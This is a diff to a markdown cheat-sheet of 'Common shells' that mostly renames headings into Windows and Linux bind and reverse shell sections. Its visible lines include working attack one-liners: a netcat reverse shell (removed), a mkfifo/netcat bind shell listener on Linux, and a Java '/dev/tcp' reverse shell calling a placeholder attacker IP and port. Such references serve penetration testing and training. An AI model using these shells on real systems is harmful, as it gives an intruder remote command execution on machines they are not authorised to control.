@@ -1,8 +1,6 @@
 # Common shells
 
-## Examples
-
-### Windows
+## Windows bind shells
 
 In some versions of netcat (including the `nc.exe` Windows version included with Kali at 
 `/usr/share/windows-resources/binaries`, and the version used in Kali itself) there is a `-e` option which allows 
@@ -12,11 +10,7 @@ for executing a process on connection:
 
 Connecting to the above listener with netcat would result in a bind shell on the target.
 
-For a reverse shell, connect back with:
-
-    nc <IP address attack machine> <port-number> -e /bin/bash
-
-#### Other reverse shells
+## Windows reverse shells
 
 Netcat:
 
@@ -106,13 +100,13 @@ ASP (Credit: Maceo – maceo @ dogmile.com):
 </HTML>
 ```
 
-### Linux
+## Linux bind shells
 
 On Linux, use this code to create a listener for a bind shell:
 
     mkfifo /tmp/f; nc -lvnp <port-number> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 
-#### Other reverse shells
+## Linux reverse shells
 
 Netcat:
 
@@ -156,7 +150,7 @@ Java:
     p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP address attack machine>/<port-number>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
     p.waitFor()
 
-### Windows server
+## Windows server reverse shells
 
 The standard one-liner PSH reverse shell:
 
